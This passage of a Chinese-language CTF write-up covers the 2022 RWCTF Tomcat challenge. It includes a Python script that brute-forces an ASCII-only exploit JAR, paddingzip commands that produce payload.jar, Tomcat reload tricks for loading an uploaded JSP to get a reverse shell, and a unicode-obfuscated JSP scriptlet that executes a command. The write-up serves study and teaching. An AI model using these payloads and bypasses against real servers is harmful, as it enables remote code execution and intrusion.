+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># autor: c0ny1</span></span><br><span class="line"><span class="comment"># date 2022-02-13</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> compress <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">allow_bytes = []</span><br><span class="line">disallowed_bytes = [<span class="number">38</span>,<span class="number">60</span>,<span class="number">39</span>,<span class="number">62</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">41</span>] <span class="comment"># &amp;&lt;&#x27;&gt;&quot;()</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment"># ASCII</span></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">in</span> disallowed_bytes:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    allow_bytes.append(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    padding_char = <span class="string">&#x27;A&#x27;</span> <span class="comment"># 填充的字符</span></span><br><span class="line">    raw_filename = <span class="string">&#x27;Exploit.class&#x27;</span> <span class="comment"># 原文件名</span></span><br><span class="line">    zip_entity_filename = <span class="string">&#x27;Exploit.class&#x27;</span> <span class="comment"># 压缩文件名</span></span><br><span class="line">    jar_filename = <span class="string">&#x27;ascii01.jar&#x27;</span> <span class="comment"># 保存文件名</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># step1 动态生成java代码并编译</span></span><br><span class="line">        javaCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                java模版代码</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">        padding_data = padding_char * num</span><br><span class="line">        javaCode = javaCode.replace(<span class="string">&quot;&#123;PADDING_DATA&#125;&quot;</span>, padding_data)</span><br><span class="line"></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;Exploit.java&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(javaCode)</span><br><span class="line">        f.close()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;javac -nowarn -g:none -source 1.5 -target 1.5 -cp jasper.jar Exploit.java&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># step02 计算压缩之后的各个部分是否在允许的ASCII范围</span></span><br><span class="line">        raw_data = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(raw_filename, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">        compressor = ASCIICompressor(<span class="built_in">bytearray</span>(allow_bytes))</span><br><span class="line">        compressed_data = compressor.compress(raw_data)[<span class="number">0</span>]</span><br><span class="line">        crc = zlib.crc32(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        st_crc = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc)</span><br><span class="line">        st_raw_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_compressed_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_cdzf = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(zip_entity_filename) + <span class="number">0x1e</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        b_crc = isAllowBytes(st_crc, allow_bytes)</span><br><span class="line">        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)</span><br><span class="line">        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)</span><br><span class="line">        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># step03 判断各个部分是否符在允许字节范围</span></span><br><span class="line">        <span class="keyword">if</span> b_crc <span class="keyword">and</span> b_raw_data <span class="keyword">and</span> b_compressed_data <span class="keyword">and</span> b_cdzf:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))</span><br><span class="line">            <span class="comment"># step04 保存最终ascii jar</span></span><br><span class="line">            output = <span class="built_in">open</span>(jar_filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Generate &#123;0&#125; success&#x27;</span>.<span class="built_in">format</span>(jar_filename))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data,</span><br><span class="line">                                                                                       b_compressed_data, b_cdzf, num,</span><br><span class="line">                                                                                       padding_char))</span><br><span class="line">        num = num + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>具体可见项目：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py</a></p>
+<h3 id="前后脏数据的构造"><a href="#前后脏数据的构造" class="headerlink" title="前后脏数据的构造"></a>前后脏数据的构造</h3><p>zip格式的文件都是支持前后加脏数据的，不过加脏数据之后需要修复下各类<code>offset</code>。可以使用zip命令进行修复,为了省事，可以直接使用phith0n师傅的<a target="_blank" rel="noopener" href="https://github.com/phith0n/PaddingZip">PaddingZip</a>项目来修复。</p>
+<p>PaddingZip 是一款可以制作包含文件内容之间填充字符的压缩文件的工具。</p>
+<p>直接使用代码：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py">https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 paddingzip.py -i ascii01.jar -o payload.jar -p <span class="string">&quot;DIRTY DATA AT THE BEGINNING &quot;</span> -a <span class="string">&quot;C0NY1 DIRTY DATA AT THE END&quot;</span></span></span><br><span class="line">file &#x27;payload.jar&#x27; is generated</span><br></pre></td></tr></table></figure>
+
+<p>可能你会有疑问，为啥末尾的脏数据是<code>C0NY1</code> + <code>DIRTY DATA AT THE END</code>。这是因为题目的代码,在获取参数时进行了<code>trim</code>操作。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/trim.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/trim.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>trim操作会将字符串首尾小于或等于<code>\u0020</code>的字符清理掉，而正常的zip文件末尾都是<code>00</code>等空字节结尾的，这会导致末尾数据丢失。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang.String#trim</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">trim</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> value.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">st</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>[] val = value;    <span class="comment">/* avoid getfield opcode */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((st &lt; len) &amp;&amp; (val[st] &lt;= <span class="string">&#x27; &#x27;</span>)) &#123;</span><br><span class="line">        st++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((st &lt; len) &amp;&amp; (val[len - <span class="number">1</span>] &lt;= <span class="string">&#x27; &#x27;</span>)) &#123;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ((st &gt; <span class="number">0</span>) || (len &lt; value.length)) ? substring(st, len) : <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了解决这个问题，我们需要一个大于<code>\u0020</code>的字符插入结尾，比如<code>C0NY1</code>。</p>
+<p>修改offset之后，使用hex编辑器把<code>jar + C0NY1</code>的数据抠出来就是最终要提交的payload了。这样在提交后目标系统会在前后加上脏字符，从而也符合offset，JAR包有效。 </p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/payload-data.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/payload-data.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="payload-data"></p>
+<p>通过如下形式上传：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/exploit.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/exploit.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="exploit"></p>
+<h3 id="加载JAR"><a href="#加载JAR" class="headerlink" title="加载JAR"></a>加载JAR</h3><p>除了解法1提到的EL表达式+写JAR触发reload重新加载JAR外，还有地方可以触发reload</p>
+<p>org.apache.catalina.startup.HostConfig#fireLifecycleEvent会装配一个生命周期监听器</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131033709.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131033709.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421131033709"></p>
+<p><code>org.apache.catalina.startup.HostConfig#lifecycleEvent</code>中，如果事件发生在运行中（PERIODIC_EVENT)，会调用check方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421130747804.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421130747804.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421130747804"></p>
+<p>如果Host开启了autoDeploy（默认开启），则会调用checkResource</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131305832.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131305832.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421131305832"></p>
+<p>checkResources 方法用于检查已部署的应用程序资源是否发生更改，如果检测到修改，则根据资源类型执行重新部署或重新加载操作。</p>
+<p>下面是redeployResources被修改的情况，调用了reload(xxx)</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131938042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421131938042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421131938042"></p>
+<p>跟进后调用了context.reload</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421132017994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421132017994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421132017994"></p>
+<p>找个地方打断点看看redeployResources中有什么？</p>
+<blockquote>
+<p>从checkResource的参数可以看出，checkResource的app.redeployResource变量是来自deployed变量</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421133906966.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421133906966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421133906966"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421133946176.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421133946176.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421133946176"></p>
+</blockquote>
+<p>我是打在HostConfig#deployDirectory()的末尾，可以看到如下五个地址都处于被监控的范围</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421135814183.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421135814183.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421135814183"></p>
+<p>然后打开<code>C:\Users\Administrator\AppData\Local\JetBrains\IntelliJIdea2023.3\tomcat\33f450f0-977b-475d-b74e-5dbb6d22246c\conf\Catalina\localhost\manager.xml</code>，里面包含了<code>WEB-INF/web.xml</code>和<code>$&#123;catalina.base&#125;/conf/web.xml</code>。注释也写的很清楚，如果有变化会触发web application will be reload</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421135900980.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421135900980.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421135900980"></p>
+<p>我这里是Tomcat8环境，好像只监控了<code>WEB-INF/web.xml</code>和<code>$&#123;catalina.base&#125;/conf/web.xml</code>，而Tomcat9环境如下图：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421140056231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421140056231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421140056231"></p>
+<p>什么情况下会调用到PERIODIC_EVENT状态的fireLifecycleEvent呢？还是StandardContext.backgroundProcess触发的。这意味着除了上面列举的loader会触发StandardContext.reload，其他文件变化（比如配置文件的变化）都会触发StandardContext.reload</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421132650314.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421132650314.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421132650314"></p>
+<p>总结一下：Tomcat8 在后台线程（通常每 10 秒一次）会检测<code>WEB-INF/web.xml</code>和<code>$&#123;catalina.base&#125;/conf/web.xml</code>文件 <code>lastModified</code> 时间戳是否发生变化，如果变了，就会：</p>
+<p>👉 **自动触发 <code>context.reload()</code>**，相当于重新部署整个 Web 应用。</p>
+<p>Tomcat9 还包括<code>WEB-INF/tomcat-web.xml</code></p>
+<p>这就是WatchedResource文件监控的代码逻辑</p>
+<p>由于应用本身没有 <code>WEB-INF/tomcat-web.xml</code> 配置文件， 因此通过利用程序本身的写文件漏洞，来创建一个 <code>WEB-INF/tomcat-web.xml/</code> 目录，可以让应用强行触发 reload，加载进先前写入的 Jar 包。</p>
+<p>不过更加通用的方式依旧是上面的EL表达式触发reload</p>
+<h3 id="调用JSP"><a href="#调用JSP" class="headerlink" title="调用JSP"></a>调用JSP</h3><p>虽然加载了JAR，但是还没有去调用他里面的JSP</p>
+<p>还记得前面我们上传的JAR是内容是释放一个shell.jsp到<code>/opt/tomcat/webapps/ROOT/</code>下吗，这样显然不能直接访问。</p>
+<p>如果把JSP放到构造的Jar包的META-INF&#x2F;resources下，那可以直接访问JSP。这是利用了在 Servlet 3.0 协议规范中，包含在 Jar 文件 <code>/META-INF/resources/</code> 路径下的资源可以直接被 web 访问的特性。</p>
+<p>那么有同学就想问，释放jsp到源代码目录的&#x2F;META-INF&#x2F;resources目录下可以吗。答案是不行</p>
+<p>你可以打开任意一个Tomcat项目，META-INF只会出现在Jar包中。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421142503841.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421142503841.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250421142503841"></p>
+<p>因为Tomcat 默认配置下不会将 <code>META-INF</code> 暴露为静态资源目录。META-INF是JAR包的默认映射行为</p>
+<p>这种将jsp写到JAR包META-INF&#x2F;resource的方式，c0ny1师傅也做了一个爆破满足ascii-jar的脚本：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py</a></p>
+<p>另外还有一个借助org.apache.jasper.compiler.StringInterpreter进行加载的，但并不能做到Tomcat通用，在此略过</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下本题利用的攻击手法：</p>
+<table>
+<thead>
+<tr>
+<th>解法1</th>
+<th>解法2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>先写一个受限的jsp修改配置满足reload需求，然后利用受限jsp向session写一个不受限的jsp内容(使用了<code>&lt;</code>这种敏感字符)，然后向&#x2F;WEB-INF&#x2F;lib上传jar触发reload触发session序列化写文件，最后访问不受限的jsp反弹shell。业务被打成404所以修改appBase以供访问JSP</td>
+<td>手动构造一个不受限的ascii-JAR包，把JSP放到JAR包中的&#x2F;META-INF&#x2F;resources以便访问。利用PaddingZip修改offset偏移使得能容纳脏数据。上传JAR包后，利用reload加载JAR包，此处可用解法1的reload，Tomcat9下还能新建<code>WEB-INF/tomcat-web.xml</code>触发reload。</td>
+</tr>
+</tbody></table>
+<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>Tomcat下JSP能执行<code>$&#123;&#125;</code>EL表达式</p>
+<p>Tomcat Session的load会序列化向临时目录写SESSION.ser文件，unload会反序列化SESSION.ser文件。StandardContext.reload会完成一次load-&gt;unload的重启</p>
+<p>reload的情况有两种：</p>
+<ul>
+<li>reloadable 为 true，web 应用中的资源文件（ .class 文件）有变动。 web 应用中&#x2F;WEB-INF&#x2F;lib的 jar 有变动</li>
+<li>WatchedResource有变动，Tomcat8.5.56下为<code>WEB-INF/web.xml</code>和<code>$&#123;catalina.base&#125;/conf/web.xml</code>，Tomcat9.0.56下会多监控一个<code>WEB-INF/tomcat-web.xml</code>，具体请见<code>your_Tomcat_home\conf\Catalina\localhost\manager.xml</code></li>
+</ul>
+<p>修改Tomcat appBase后reload会重新挂载资源目录</p>
+<p>Tomcat加载JAR失败并不会导致崩溃，而是继续加载其他JAR。</p>
+<p>JAR实际上是个ZIP，但是JAR必须包括中央目录项和EOCD块</p>
+<p>在文件上传漏洞点，但是受限为字符串形式时，如果需要上传JAR，可以考虑利用ascii-jar项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py</a></p>
+<p>如果需要将JSP包含在JAR包中的META-INF&#x2F;resources目录以供加载后直接访问，ascii-jar项目也提供了将二进制JAR转为字符串的demo：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py</a></p>
+<p>如果上传前后有脏数据，可以使用paddingzip项目：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py">https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 paddingzip.py -i ascii01.jar -o payload.jar -p <span class="string">&quot;DIRTY DATA AT THE BEGINNING &quot;</span> -a <span class="string">&quot;C0NY1 DIRTY DATA AT THE END&quot;</span></span></span><br><span class="line">file &#x27;payload.jar&#x27; is generated</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改offset后需要手动把脏数据外的jar数据抠出来</span></span><br></pre></td></tr></table></figure>
+
+<p>trim()会分离字符串首尾小于或等于<code>\u0020</code>的字符</p>
+<p>2025AliCTF出题出了一道Java链表的ROP题目，虽然也很难，但是其精美程度远远不及这道2022RWCTF，真是艺术品</p>
+<p>本文终结</p>
+<h2 id="Tomcat中JSP的绕过"><a href="#Tomcat中JSP的绕过" class="headerlink" title="Tomcat中JSP的绕过"></a>Tomcat中JSP的绕过</h2><p>Tomcat是怎么触发EL表达式的？对JSP的解析还有其他trick吗？</p>
+<p>另外，通过深入分析 Tomcat 的 JSP 编译流程，发现了以下关键点，虽然除了EL表达式，其他跟本题并没有什么关系：</p>
+<h3 id="trick1：Unicode-编码绕过"><a href="#trick1：Unicode-编码绕过" class="headerlink" title="trick1：Unicode 编码绕过"></a>trick1：Unicode 编码绕过</h3><p>Tomcat 在编译 JSP 时，支持对 Unicode 编码的解析，允许使用 <code>\uXXXX</code> 格式的字符编码，且多个 <code>u</code> 字符是被忽略的。例如：</p>
+ <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%\uuuuuuuuuuuu0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码在编译后等同于执行 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，从而实现命令执行。</p>
+<p>在代码中体现为org.eclipse.jdt.internal.compiler.parser.Scanner.getNextChar()发现 <code>\\</code> 和一个 <code>u</code> 字符，将转而调用 <code>getNextUnicodeChar</code> 方法进行 Unicode 字符串的解析。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671785090605.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671785090605.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1671785090605"></p>
+<blockquote>
+<p><code>\\</code>就是转义后的<code>\</code></p>
+</blockquote>
+<p> <code>getNextUnicodeChar</code> 方法中写了一个 while 循环来跳过其中的 <code>u</code> 字符，也就是说在 Unicode 中这个 <code>u</code> 可以重复写若干个</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671785106245.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671785106245.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1671785106245"></p>
+<h3 id="trick2：文件编码"><a href="#trick2：文件编码" class="headerlink" title="trick2：文件编码"></a>trick2：文件编码</h3><p>Tomcat 支持多种编码如 UTF-8、UTF-16LE、ISO-10646 等，自动识别 BOM，也可通过 <code>pageEncoding</code> 手动指定。</p>
+<p>BOM 是一个以二进制形式存在于文件开头的特殊字节序列（如UTF为 <code>EF BB BF</code>，UTF-16（大端序）)：BOM 为 <code>FE FF</code>），用于标识文件的编码方式和字节顺序。某些编辑器或操作系统（如 Windows 的记事本）在保存 UTF-8 文件时会自动添加 BOM，而其他编辑器（如 Linux 系统中的 Vim）则不会。如果一个文件开头未包含特定的字节序列（如 <code>EF BB BF</code>），则可以认为该文件没有 BOM（Byte Order Mark）。</p>
+<p>而pageEncoding是JSP 页面指令中的一个属性</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="trick3：JSP标签"><a href="#trick3：JSP标签" class="headerlink" title="trick3：JSP标签"></a>trick3：JSP标签</h3><p><code>&lt;%@</code> 是用于定义指令（Directive）的语法起始标记。指令用于向 JSP 容器提供页面的配置信息和处理指示。</p>
+<p><code>&lt;jsp:directive.*&gt;</code> —— XML 语法的 JSP 指令：</p>
+<p><code>&lt;jsp:directive.page ... /&gt;</code>：设置页面属性。</p>
+<p><code>&lt;jsp:directive.include file=&quot;...&quot; /&gt;</code>：包含其他文件。</p>
+<p><code>&lt;jsp:directive.taglib uri=&quot;...&quot; prefix=&quot;...&quot; /&gt;</code>：引入标签库。</p>
+<p><code> &lt;% ... %&gt;</code> 和 <code>&lt;jsp:scriptlet</code>&gt;嵌入 Java 代码到 JSP 页面中，代码将在服务器端执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">  <span class="comment">// Java 代码</span></span><br><span class="line">  out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除了上面三种标签外，还有JSTL<a target="_blank" rel="noopener" href="https://www.runoob.com/jsp/jsp-jstl.html">https://www.runoob.com/jsp/jsp-jstl.html</a></p>
+<p>如：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250419170914223.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250419170914223.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250419170914223"></p>
+<p>遇到了再看菜鸟也来得及</p>
+<p>除此以外，看到对jsp的标签解析函数<code>org.apache.jasper.compiler.Parser.parseElements(Node parent)</code>，还支持解析<code>$&#123;</code>开头的EL表达式，开启isDeferredSyntaxAllowedAsLiteral后还支持<code>#&#123;</code>解析EL表达式</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420150749044.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420150749044.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420150749044"></p>
+<blockquote>
